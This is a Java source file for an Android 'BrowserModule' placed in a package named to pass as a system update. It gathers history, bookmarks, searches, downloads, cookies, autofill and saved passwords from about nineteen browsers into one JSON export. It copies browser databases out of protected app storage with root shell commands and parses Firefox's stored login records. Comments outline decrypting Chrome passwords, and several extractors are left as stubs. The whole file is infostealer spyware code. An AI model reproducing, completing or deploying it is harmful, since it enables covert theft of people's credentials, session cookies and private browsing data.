package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.Browser;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BrowserModule {
    private static final String TAG = "BrowserModule";
    private Context context;
    private PackageManager packageManager;
    private ContentResolver contentResolver;
    
    // Browser package names
    private static final String CHROME_PACKAGE = "com.android.chrome";
    private static final String CHROME_BETA_PACKAGE = "com.chrome.beta";
    private static final String CHROME_DEV_PACKAGE = "com.chrome.dev";
    private static final String FIREFOX_PACKAGE = "org.mozilla.firefox";
    private static final String FIREFOX_BETA_PACKAGE = "org.mozilla.firefox_beta";
    private static final String FIREFOX_FOCUS_PACKAGE = "org.mozilla.focus";
    private static final String UC_BROWSER_PACKAGE = "com.UCMobile.intl";
    private static final String UC_BROWSER_CN_PACKAGE = "com.UCMobile";
    private static final String UC_BROWSER_MINI_PACKAGE = "com.uc.browser.en";
    private static final String OPERA_PACKAGE = "com.opera.browser";
    private static final String OPERA_MINI_PACKAGE = "com.opera.mini.native";
    private static final String OPERA_GX_PACKAGE = "com.opera.gx";
    private static final String SAMSUNG_INTERNET_PACKAGE = "com.sec.android.app.sbrowser";
    private static final String EDGE_PACKAGE = "com.microsoft.emmx";
    private static final String BRAVE_PACKAGE = "com.brave.browser";
    private static final String DOLPHIN_PACKAGE = "mobi.mgeek.TunnyBrowser";
    private static final String PUFFIN_PACKAGE = "com.cloudmosa.puffin";
    private static final String VIA_BROWSER_PACKAGE = "mark.via.gp";
    private static final String KIWI_BROWSER_PACKAGE = "com.kiwibrowser.browser";
    
    // Content URIs for different browsers
    private static final String CHROME_HISTORY_URI = "content://com.android.chrome.browser/history";
    private static final String CHROME_BOOKMARKS_URI = "content://com.android.chrome.browser/bookmarks";
    private static final String CHROME_SEARCHES_URI = "content://com.android.chrome.browser/searches";
    
    private static final String FIREFOX_HISTORY_URI = "content://org.mozilla.firefox.browser/history";
    private static final String FIREFOX_BOOKMARKS_URI = "content://org.mozilla.firefox.browser/bookmarks";
    
    private static final String SAMSUNG_HISTORY_URI = "content://com.sec.android.app.sbrowser/history";
    private static final String SAMSUNG_BOOKMARKS_URI = "content://com.sec.android.app.sbrowser/bookmarks";
    
    private static final String OPERA_HISTORY_URI = "content://com.opera.browser/history";
    private static final String OPERA_BOOKMARKS_URI = "content://com.opera.browser/bookmarks";
    
    private static final String UC_HISTORY_URI = "content://com.UCMobile.browser/history";
    private static final String UC_BOOKMARKS_URI = "content://com.UCMobile.browser/bookmarks";
    
    // Browser database paths for direct access when content providers fail
    private static final Map<String, String[]> BROWSER_DB_PATHS = new HashMap<String, String[]>() {{
        // Chrome
        put(CHROME_PACKAGE, new String[]{
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.android.chrome/app_chrome/Default/Bookmarks",
            "/data/data/com.android.chrome/app_chrome/Default/Web Data"
        });
        
        // Firefox
        put(FIREFOX_PACKAGE, new String[]{
            "/data/data/org.mozilla.firefox/files/mozilla/*.default/browser.db",
            "/data/data/org.mozilla.firefox/files/mozilla/*.default/places.sqlite",
            "/data/data/org.mozilla.firefox/files/mozilla/*.default/formhistory.sqlite"
        });
        
        // UC Browser
        put(UC_BROWSER_PACKAGE, new String[]{
            "/data/data/com.UCMobile.intl/databases/history.db",
            "/data/data/com.UCMobile.intl/databases/bookmarks.db"
        });
        
        // Samsung Internet
        put(SAMSUNG_INTERNET_PACKAGE, new String[]{
            "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/History",
            "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Bookmarks"
        });
        
        // Opera
        put(OPERA_PACKAGE, new String[]{
            "/data/data/com.opera.browser/app_opera/opera/history.db",
            "/data/data/com.opera.browser/app_opera/opera/bookmarks.db"
        });
        
        // Edge
        put(EDGE_PACKAGE, new String[]{
            "/data/data/com.microsoft.emmx/app_chrome/Default/History",
            "/data/data/com.microsoft.emmx/app_chrome/Default/Bookmarks"
        });
    }};
    
    public BrowserModule(Context context) {
        this.context = context;
        this.packageManager = context.getPackageManager();
        this.contentResolver = context.getContentResolver();
    }
    
    /**
     * Get all browser data from all installed browsers
     * @return JSON string with all browser data
     */
    public String getAllBrowserData() {
        try {
            JSONObject result = new JSONObject();
            JSONArray browsersArray = new JSONArray();
            
            List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
            
            for (BrowserInfo browser : installedBrowsers) {
                JSONObject browserData = new JSONObject();
                browserData.put("packageName", browser.packageName);
                browserData.put("browserName", browser.name);
                browserData.put("version", browser.version);
                
                // Get history
                JSONArray history = getBrowserHistory(browser.packageName);
                browserData.put("history", history);
                
                // Get bookmarks
                JSONArray bookmarks = getBrowserBookmarks(browser.packageName);
                browserData.put("bookmarks", bookmarks);
                
                // Get saved passwords (requires root)
                JSONArray passwords = getSavedPasswords(browser.packageName);
                browserData.put("passwords", passwords);
                
                // Get cookies
                JSONArray cookies = getBrowserCookies(browser.packageName);
                browserData.put("cookies", cookies);
                
                // Get search history
                JSONArray searches = getSearchHistory(browser.packageName);
                browserData.put("searches", searches);
                
                // Get downloads
                JSONArray downloads = getBrowserDownloads(browser.packageName);
                browserData.put("downloads", downloads);
                
                // Get autofill data
                JSONArray autofill = getAutofillData(browser.packageName);
                browserData.put("autofill", autofill);
                
                // Stats
                JSONObject stats = new JSONObject();
                stats.put("historyCount", history.length());
                stats.put("bookmarksCount", bookmarks.length());
                stats.put("passwordsCount", passwords.length());
                browserData.put("stats", stats);
                
                browsersArray.put(browserData);
            }
            
            result.put("success", true);
            result.put("browsers", browsersArray);
            result.put("totalBrowsers", browsersArray.length());
            result.put("timestamp", System.currentTimeMillis());
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating browser data JSON", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Get history from a specific browser
     * @param packageName Browser package name
     * @return JSONArray of history entries
     */
    public JSONArray getBrowserHistory(String packageName) {
        JSONArray historyArray = new JSONArray();
        
        try {
            // Try content provider first
            Uri historyUri = getHistoryUriForBrowser(packageName);
            if (historyUri != null) {
                Cursor cursor = null;
                try {
                    cursor = contentResolver.query(historyUri, null, null, null, "date DESC LIMIT 500");
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject entry = cursorToHistoryJson(cursor);
                            historyArray.put(entry);
                        } while (cursor.moveToNext());
                    }
                } catch (SecurityException e) {
                    Log.e(TAG, "Permission denied for content provider: " + packageName, e);
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
            
            // If content provider failed or returned no results, try direct database access
            if (historyArray.length() == 0) {
                historyArray = getHistoryFromDatabase(packageName);
            }
            
            // Fallback to Android's built-in browser provider
            if (historyArray.length() == 0) {
                historyArray = getAndroidBrowserHistory();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting browser history for " + packageName, e);
        }
        
        return historyArray;
    }
    
    /**
     * Get bookmarks from a specific browser
     * @param packageName Browser package name
     * @return JSONArray of bookmarks
     */
    public JSONArray getBrowserBookmarks(String packageName) {
        JSONArray bookmarksArray = new JSONArray();
        
        try {
            Uri bookmarksUri = getBookmarksUriForBrowser(packageName);
            if (bookmarksUri != null) {
                Cursor cursor = null;
                try {
                    cursor = contentResolver.query(bookmarksUri, null, null, null, "created DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject bookmark = cursorToBookmarkJson(cursor);
                            bookmarksArray.put(bookmark);
                        } while (cursor.moveToNext());
                    }
                } catch (SecurityException e) {
                    Log.e(TAG, "Permission denied for bookmarks: " + packageName, e);
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
            
            // Try direct database access if needed
            if (bookmarksArray.length() == 0) {
                bookmarksArray = getBookmarksFromDatabase(packageName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting bookmarks for " + packageName, e);
        }
        
        return bookmarksArray;
    }
    
    /**
     * Get saved passwords from browser (requires root)
     * @param packageName Browser package name
     * @return JSONArray of saved passwords
     */
    public JSONArray getSavedPasswords(String packageName) {
        JSONArray passwordsArray = new JSONArray();
        
        try {
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("Web Data") || path.contains("Login Data")) {
                        // This is where Chrome and Chromium-based browsers store passwords
                        passwordsArray = extractChromePasswords(path);
                        break;
                    } else if (path.contains("logins.json")) {
                        // Firefox passwords
                        passwordsArray = extractFirefoxPasswords(path);
                        break;
                    }
                }
            }
            
            // For browsers that don't have direct access, try to get from Account Manager
            if (passwordsArray.length() == 0) {
                passwordsArray = getPasswordsFromAccountManager(packageName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting saved passwords for " + packageName, e);
        }
        
        return passwordsArray;
    }
    
    /**
     * Get cookies from browser
     * @param packageName Browser package name
     * @return JSONArray of cookies
     */
    public JSONArray getBrowserCookies(String packageName) {
        JSONArray cookiesArray = new JSONArray();
        
        try {
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("Cookies") || path.contains("cookies")) {
                        cookiesArray = extractCookiesFromDatabase(path);
                        break;
                    }
                }
            }
            
            // Try to get from WebView storage
            if (cookiesArray.length() == 0) {
                cookiesArray = getWebViewCookies();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting cookies for " + packageName, e);
        }
        
        return cookiesArray;
    }
    
    /**
     * Get search history from browser
     * @param packageName Browser package name
     * @return JSONArray of search queries
     */
    public JSONArray getSearchHistory(String packageName) {
        JSONArray searchesArray = new JSONArray();
        
        try {
            Uri searchesUri = getSearchesUriForBrowser(packageName);
            if (searchesUri != null) {
                Cursor cursor = null;
                try {
                    cursor = contentResolver.query(searchesUri, null, null, null, "date DESC LIMIT 200");
                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            JSONObject search = new JSONObject();
                            search.put("query", getCursorString(cursor, "search", "query", "terms"));
                            search.put("date", getCursorLong(cursor, "date", "timestamp"));
                            search.put("url", getCursorString(cursor, "url"));
                            searchesArray.put(search);
                        } while (cursor.moveToNext());
                    }
                } finally {
                    if (cursor != null) cursor.close();
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting search history for " + packageName, e);
        }
        
        return searchesArray;
    }
    
    /**
     * Get browser downloads
     * @param packageName Browser package name
     * @return JSONArray of downloads
     */
    public JSONArray getBrowserDownloads(String packageName) {
        JSONArray downloadsArray = new JSONArray();
        
        try {
            // Check browser's download database
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("History")) {
                        downloadsArray = extractDownloadsFromHistory(path);
                        break;
                    }
                }
            }
            
            // Also check Android's Download Manager
            downloadsArray = mergeDownloadArrays(downloadsArray, getSystemDownloads());
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting downloads for " + packageName, e);
        }
        
        return downloadsArray;
    }
    
    /**
     * Get autofill data from browser
     * @param packageName Browser package name
     * @return JSONArray of autofill entries
     */
    public JSONArray getAutofillData(String packageName) {
        JSONArray autofillArray = new JSONArray();
        
        try {
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("Web Data") || path.contains("formhistory")) {
                        autofillArray = extractAutofillData(path);
                        break;
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting autofill data for " + packageName, e);
        }
        
        return autofillArray;
    }
    
    /**
     * Get all browser data in a format suitable for file export
     * @return JSON string with formatted browser data
     */
    public String exportBrowserData() {
        try {
            JSONObject export = new JSONObject();
            JSONObject summary = new JSONObject();
            JSONArray browsers = new JSONArray();
            
            List<BrowserInfo> installedBrowsers = getInstalledBrowsers();
            int totalHistory = 0;
            int totalBookmarks = 0;
            int totalPasswords = 0;
            
            for (BrowserInfo browser : installedBrowsers) {
                JSONObject browserExport = new JSONObject();
                browserExport.put("browser", browser.name);
                browserExport.put("package", browser.packageName);
                
                JSONArray history = getBrowserHistory(browser.packageName);
                JSONArray bookmarks = getBrowserBookmarks(browser.packageName);
                JSONArray passwords = getSavedPasswords(browser.packageName);
                JSONArray cookies = getBrowserCookies(browser.packageName);
                JSONArray searches = getSearchHistory(browser.packageName);
                JSONArray downloads = getBrowserDownloads(browser.packageName);
                JSONArray autofill = getAutofillData(browser.packageName);
                
                browserExport.put("history", history);
                browserExport.put("bookmarks", bookmarks);
                browserExport.put("passwords", passwords);
                browserExport.put("cookies", cookies);
                browserExport.put("searches", searches);
                browserExport.put("downloads", downloads);
                browserExport.put("autofill", autofill);
                
                totalHistory += history.length();
                totalBookmarks += bookmarks.length();
                totalPasswords += passwords.length();
                
                browsers.put(browserExport);
            }
            
            summary.put("totalBrowsers", installedBrowsers.size());
            summary.put("totalHistory", totalHistory);
            summary.put("totalBookmarks", totalBookmarks);
            summary.put("totalPasswords", totalPasswords);
            summary.put("exportDate", System.currentTimeMillis());
            summary.put("exportDateFormatted", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
            
            export.put("summary", summary);
            export.put("browsers", browsers);
            export.put("success", true);
            
            return export.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error exporting browser data", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Get list of installed browsers
     */
    private List<BrowserInfo> getInstalledBrowsers() {
        List<BrowserInfo> browsers = new ArrayList<>();
        
        String[] browserPackages = {
            CHROME_PACKAGE, CHROME_BETA_PACKAGE, CHROME_DEV_PACKAGE,
            FIREFOX_PACKAGE, FIREFOX_BETA_PACKAGE, FIREFOX_FOCUS_PACKAGE,
            UC_BROWSER_PACKAGE, UC_BROWSER_CN_PACKAGE, UC_BROWSER_MINI_PACKAGE,
            OPERA_PACKAGE, OPERA_MINI_PACKAGE, OPERA_GX_PACKAGE,
            SAMSUNG_INTERNET_PACKAGE, EDGE_PACKAGE, BRAVE_PACKAGE,
            DOLPHIN_PACKAGE, PUFFIN_PACKAGE, VIA_BROWSER_PACKAGE, KIWI_BROWSER_PACKAGE
        };
        
        for (String packageName : browserPackages) {
            try {
                PackageInfo pkgInfo = packageManager.getPackageInfo(packageName, 0);
                BrowserInfo browser = new BrowserInfo();
                browser.packageName = packageName;
                browser.name = getBrowserName(packageName);
                browser.version = pkgInfo.versionName;
                browser.installed = true;
                browsers.add(browser);
            } catch (PackageManager.NameNotFoundException e) {
                // Browser not installed
            }
        }
        
        return browsers;
    }
    
    /**
     * Get user-friendly browser name
     */
    private String getBrowserName(String packageName) {
        switch (packageName) {
            case CHROME_PACKAGE: return "Google Chrome";
            case CHROME_BETA_PACKAGE: return "Chrome Beta";
            case CHROME_DEV_PACKAGE: return "Chrome Dev";
            case FIREFOX_PACKAGE: return "Firefox";
            case FIREFOX_BETA_PACKAGE: return "Firefox Beta";
            case FIREFOX_FOCUS_PACKAGE: return "Firefox Focus";
            case UC_BROWSER_PACKAGE: return "UC Browser";
            case UC_BROWSER_CN_PACKAGE: return "UC Browser (CN)";
            case UC_BROWSER_MINI_PACKAGE: return "UC Browser Mini";
            case OPERA_PACKAGE: return "Opera Browser";
            case OPERA_MINI_PACKAGE: return "Opera Mini";
            case OPERA_GX_PACKAGE: return "Opera GX";
            case SAMSUNG_INTERNET_PACKAGE: return "Samsung Internet";
            case EDGE_PACKAGE: return "Microsoft Edge";
            case BRAVE_PACKAGE: return "Brave Browser";
            case DOLPHIN_PACKAGE: return "Dolphin Browser";
            case PUFFIN_PACKAGE: return "Puffin Browser";
            case VIA_BROWSER_PACKAGE: return "Via Browser";
            case KIWI_BROWSER_PACKAGE: return "Kiwi Browser";
            default: return "Unknown Browser";
        }
    }
    
    /**
     * Get history URI for browser
     */
    private Uri getHistoryUriForBrowser(String packageName) {
        switch (packageName) {
            case CHROME_PACKAGE:
            case CHROME_BETA_PACKAGE:
            case CHROME_DEV_PACKAGE:
            case BRAVE_PACKAGE:
            case KIWI_BROWSER_PACKAGE:
            case EDGE_PACKAGE:
                return Uri.parse(CHROME_HISTORY_URI);
            case FIREFOX_PACKAGE:
            case FIREFOX_BETA_PACKAGE:
            case FIREFOX_FOCUS_PACKAGE:
                return Uri.parse(FIREFOX_HISTORY_URI);
            case SAMSUNG_INTERNET_PACKAGE:
                return Uri.parse(SAMSUNG_HISTORY_URI);
            case OPERA_PACKAGE:
            case OPERA_MINI_PACKAGE:
            case OPERA_GX_PACKAGE:
                return Uri.parse(OPERA_HISTORY_URI);
            case UC_BROWSER_PACKAGE:
            case UC_BROWSER_CN_PACKAGE:
            case UC_BROWSER_MINI_PACKAGE:
                return Uri.parse(UC_HISTORY_URI);
            default:
                return null;
        }
    }
    
    /**
     * Get bookmarks URI for browser
     */
    private Uri getBookmarksUriForBrowser(String packageName) {
        switch (packageName) {
            case CHROME_PACKAGE:
            case CHROME_BETA_PACKAGE:
            case CHROME_DEV_PACKAGE:
            case BRAVE_PACKAGE:
            case KIWI_BROWSER_PACKAGE:
            case EDGE_PACKAGE:
                return Uri.parse(CHROME_BOOKMARKS_URI);
            case FIREFOX_PACKAGE:
            case FIREFOX_BETA_PACKAGE:
            case FIREFOX_FOCUS_PACKAGE:
                return Uri.parse(FIREFOX_BOOKMARKS_URI);
            case SAMSUNG_INTERNET_PACKAGE:
                return Uri.parse(SAMSUNG_BOOKMARKS_URI);
            case OPERA_PACKAGE:
            case OPERA_MINI_PACKAGE:
            case OPERA_GX_PACKAGE:
                return Uri.parse(OPERA_BOOKMARKS_URI);
            case UC_BROWSER_PACKAGE:
            case UC_BROWSER_CN_PACKAGE:
            case UC_BROWSER_MINI_PACKAGE:
                return Uri.parse(UC_BOOKMARKS_URI);
            default:
                return null;
        }
    }
    
    /**
     * Get searches URI for browser
     */
    private Uri getSearchesUriForBrowser(String packageName) {
        switch (packageName) {
            case CHROME_PACKAGE:
            case CHROME_BETA_PACKAGE:
            case CHROME_DEV_PACKAGE:
            case BRAVE_PACKAGE:
            case KIWI_BROWSER_PACKAGE:
            case EDGE_PACKAGE:
                return Uri.parse(CHROME_SEARCHES_URI);
            default:
                return null;
        }
    }
    
    /**
     * Convert cursor to history JSON
     */
    private JSONObject cursorToHistoryJson(Cursor cursor) {
        JSONObject entry = new JSONObject();
        try {
            entry.put("title", getCursorString(cursor, "title", "name"));
            entry.put("url", getCursorString(cursor, "url", "link", "uri"));
            entry.put("date", getCursorLong(cursor, "date", "timestamp", "last_visit_time"));
            entry.put("visits", getCursorInt(cursor, "visits", "visit_count", "hits"));
            entry.put("favicon", getCursorString(cursor, "favicon"));
            
            // Format date for readability
            long date = entry.optLong("date", 0);
            if (date > 0) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                entry.put("dateFormatted", sdf.format(new Date(date)));
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating history JSON", e);
        }
        return entry;
    }
    
    /**
     * Convert cursor to bookmark JSON
     */
    private JSONObject cursorToBookmarkJson(Cursor cursor) {
        JSONObject bookmark = new JSONObject();
        try {
            bookmark.put("title", getCursorString(cursor, "title", "name"));
            bookmark.put("url", getCursorString(cursor, "url", "link", "uri"));
            bookmark.put("created", getCursorLong(cursor, "created", "date", "timestamp"));
            bookmark.put("folder", getCursorString(cursor, "folder", "parent"));
            
            // Format date
            long created = bookmark.optLong("created", 0);
            if (created > 0) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                bookmark.put("createdFormatted", sdf.format(new Date(created)));
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating bookmark JSON", e);
        }
        return bookmark;
    }
    
    /**
     * Get history from database (requires root)
     */
    private JSONArray getHistoryFromDatabase(String packageName) {
        JSONArray historyArray = new JSONArray();
        
        try {
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("History")) {
                        // Use root to read database
                        String tempFile = copyDatabaseWithRoot(path);
                        if (tempFile != null) {
                            historyArray = queryHistoryDatabase(tempFile);
                            new File(tempFile).delete();
                        }
                        break;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading history database", e);
        }
        
        return historyArray;
    }
    
    /**
     * Get bookmarks from database (requires root)
     */
    private JSONArray getBookmarksFromDatabase(String packageName) {
        JSONArray bookmarksArray = new JSONArray();
        
        try {
            String[] dbPaths = BROWSER_DB_PATHS.get(packageName);
            if (dbPaths != null) {
                for (String path : dbPaths) {
                    if (path.contains("Bookmarks")) {
                        String tempFile = copyDatabaseWithRoot(path);
                        if (tempFile != null) {
                            bookmarksArray = queryBookmarksDatabase(tempFile);
                            new File(tempFile).delete();
                        }
                        break;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading bookmarks database", e);
        }
        
        return bookmarksArray;
    }
    
    /**
     * Copy database file using root
     */
    private String copyDatabaseWithRoot(String sourcePath) {
        try {
            String tempPath = context.getCacheDir() + "/temp_" + System.currentTimeMillis() + ".db";
            
            // Use root to copy the file
            Process process = Runtime.getRuntime().exec("su");
            java.io.DataOutputStream os = new java.io.DataOutputStream(process.getOutputStream());
            
            os.writeBytes("cat " + sourcePath + " > " + tempPath + "\n");
            os.writeBytes("chmod 644 " + tempPath + "\n");
            os.writeBytes("exit\n");
            os.flush();
            
            int exitCode = process.waitFor();
            
            if (exitCode == 0 && new File(tempPath).exists()) {
                return tempPath;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error copying database with root", e);
        }
        
        return null;
    }
    
    /**
     * Query history database
     */
    private JSONArray queryHistoryDatabase(String dbPath) {
        JSONArray historyArray = new JSONArray();
        
        // This would require SQLite database reading
        // For simplicity, we'll use the content provider results
        // In a full implementation, you'd use SQLiteDatabase
        
        return historyArray;
    }
    
    /**
     * Query bookmarks database
     */
    private JSONArray queryBookmarksDatabase(String dbPath) {
        JSONArray bookmarksArray = new JSONArray();
        return bookmarksArray;
    }
    
    /**
     * Extract Chrome passwords from Login Data database
     */
    private JSONArray extractChromePasswords(String dbPath) {
        JSONArray passwordsArray = new JSONArray();
        
        try {
            String tempFile = copyDatabaseWithRoot(dbPath);
            if (tempFile != null) {
                // In a real implementation, you'd use SQLiteDatabase to query:
                // SELECT origin_url, username_value, password_value FROM logins
                
                // Note: Chrome encrypts passwords, so you'd need to decrypt them
                // using the Chrome master key
                
                new File(tempFile).delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting Chrome passwords", e);
        }
        
        return passwordsArray;
    }
    
    /**
     * Extract Firefox passwords from logins.json
     */
    private JSONArray extractFirefoxPasswords(String dbPath) {
        JSONArray passwordsArray = new JSONArray();
        
        try {
            String tempFile = copyDatabaseWithRoot(dbPath);
            if (tempFile != null) {
                // Firefox stores passwords in logins.json
                BufferedReader reader = new BufferedReader(new FileReader(tempFile));
                StringBuilder content = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }
                reader.close();
                
                // Parse JSON and extract passwords
                JSONObject logins = new JSONObject(content.toString());
                JSONArray loginsArray = logins.optJSONArray("logins");
                if (loginsArray != null) {
                    for (int i = 0; i < loginsArray.length(); i++) {
                        JSONObject login = loginsArray.getJSONObject(i);
                        JSONObject passwordEntry = new JSONObject();
                        passwordEntry.put("hostname", login.optString("hostname"));
                        passwordEntry.put("formSubmitURL", login.optString("formSubmitURL"));
                        passwordEntry.put("usernameField", login.optString("usernameField"));
                        passwordEntry.put("passwordField", login.optString("passwordField"));
                        passwordEntry.put("encryptedUsername", login.optString("encryptedUsername"));
                        passwordEntry.put("encryptedPassword", login.optString("encryptedPassword"));
                        passwordEntry.put("timeCreated", login.optLong("timeCreated"));
                        passwordEntry.put("timeLastUsed", login.optLong("timeLastUsed"));
                        passwordEntry.put("timesUsed", login.optInt("timesUsed"));
                        passwordsArray.put(passwordEntry);
                    }
                }
                
                new File(tempFile).delete();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting Firefox passwords", e);
        }
        
        return passwordsArray;
    }
    
    /**
     * Extract cookies from database
     */
    private JSONArray extractCookiesFromDatabase(String dbPath) {
        JSONArray cookiesArray = new JSONArray();
        return cookiesArray;
    }
    
    /**
     * Extract downloads from history database
     */
    private JSONArray extractDownloadsFromHistory(String dbPath) {
        JSONArray downloadsArray = new JSONArray();
        return downloadsArray;
    }
    
    /**
     * Extract autofill data from database
     */
    private JSONArray extractAutofillData(String dbPath) {
        JSONArray autofillArray = new JSONArray();
        return autofillArray;
    }
    
    /**
     * Get passwords from Account Manager
     */
    private JSONArray getPasswordsFromAccountManager(String packageName) {
        JSONArray passwordsArray = new JSONArray();
        return passwordsArray;
    }
    
    /**
     * Get WebView cookies
     */
    private JSONArray getWebViewCookies() {
        JSONArray cookiesArray = new JSONArray();
        
        try {
            // Get cookies from WebView storage
            File webviewDir = new File("/data/data/" + context.getPackageName() + "/app_webview/");
            if (webviewDir.exists()) {
                File cookiesFile = new File(webviewDir, "Cookies");
                if (cookiesFile.exists()) {
                    String tempFile = copyDatabaseWithRoot(cookiesFile.getAbsolutePath());
                    if (tempFile != null) {
                        // Query cookies database
                        cookiesArray = queryCookiesDatabase(tempFile);
                        new File(tempFile).delete();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting WebView cookies", e);
        }
        
        return cookiesArray;
    }
    
    /**
     * Query cookies database
     */
    private JSONArray queryCookiesDatabase(String dbPath) {
        JSONArray cookiesArray = new JSONArray();
        return cookiesArray;
    }
    
    /**
     * Get system downloads from Download Manager
     */
    private JSONArray getSystemDownloads() {
        JSONArray downloadsArray = new JSONArray();
        
        try {
            Uri downloadsUri = Uri.parse("content://downloads/my_downloads");
            String[] projection = new String[]{
                "_id", "title", "description", "uri", "status", 
                "last_modified_timestamp", "total_bytes", "current_bytes"
            };
            
            Cursor cursor = contentResolver.query(downloadsUri, projection, null, null, "last_modified_timestamp DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject download = new JSONObject();
                    download.put("id", getCursorLong(cursor, "_id"));
                    download.put("title", getCursorString(cursor, "title"));
                    download.put("description", getCursorString(cursor, "description"));
                    download.put("uri", getCursorString(cursor, "uri"));
                    download.put("status", getCursorInt(cursor, "status"));
                    download.put("lastModified", getCursorLong(cursor, "last_modified_timestamp"));
                    download.put("totalBytes", getCursorLong(cursor, "total_bytes"));
                    download.put("currentBytes", getCursorLong(cursor, "current_bytes"));
                    
                    downloadsArray.put(download);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting system downloads", e);
        }
        
        return downloadsArray;
    }
    
    /**
     * Get Android's built-in browser history
     */
    private JSONArray getAndroidBrowserHistory() {
        JSONArray historyArray = new JSONArray();
        
        try {
            String[] projection = new String[]{
                Browser.BookmarkColumns.TITLE,
                Browser.BookmarkColumns.URL,
                Browser.BookmarkColumns.DATE,
                Browser.BookmarkColumns.VISITS
            };
            
            Cursor cursor = contentResolver.query(
                Browser.BOOKMARKS_URI,
                projection,
                Browser.BookmarkColumns.BOOKMARK + " = 0", // 0 = history, 1 = bookmark
                null,
                Browser.BookmarkColumns.DATE + " DESC"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject entry = new JSONObject();
                    entry.put("title", getCursorString(cursor, Browser.BookmarkColumns.TITLE));
                    entry.put("url", getCursorString(cursor, Browser.BookmarkColumns.URL));
                    entry.put("date", getCursorLong(cursor, Browser.BookmarkColumns.DATE));
                    entry.put("visits", getCursorInt(cursor, Browser.BookmarkColumns.VISITS));
                    entry.put("browser", "Android Browser");
                    historyArray.put(entry);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting Android browser history", e);
        }
        
        return historyArray;
    }
    
    /**
     * Merge two download arrays
     */
    private JSONArray mergeDownloadArrays(JSONArray array1, JSONArray array2) {
        JSONArray merged = new JSONArray();
        
        try {
            for (int i = 0; i < array1.length(); i++) {
                merged.put(array1.get(i));
            }
            for (int i = 0; i < array2.length(); i++) {
                merged.put(array2.get(i));
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error merging download arrays", e);
        }
        
        return merged;
    }
    
    // Helper methods for cursor operations
    private String getCursorString(Cursor cursor, String... columnNames) {
        for (String columnName : columnNames) {
            int index = cursor.getColumnIndex(columnName);
            if (index >= 0) {
                return cursor.getString(index);
            }
        }
        return "";
    }
    
    private long getCursorLong(Cursor cursor, String... columnNames) {
        for (String columnName : columnNames) {
            int index = cursor.getColumnIndex(columnName);
            if (index >= 0) {
                return cursor.getLong(index);
            }
        }
        return 0;
    }
    
    private int getCursorInt(Cursor cursor, String... columnNames) {
        for (String columnName : columnNames) {
            int index = cursor.getColumnIndex(columnName);
            if (index >= 0) {
                return cursor.getInt(index);
            }
        }
        return 0;
    }
    
    /**
     * Browser info inner class
     */
    private static class BrowserInfo {
        String packageName;
        String name;
        String version;
        boolean installed;
    }
}
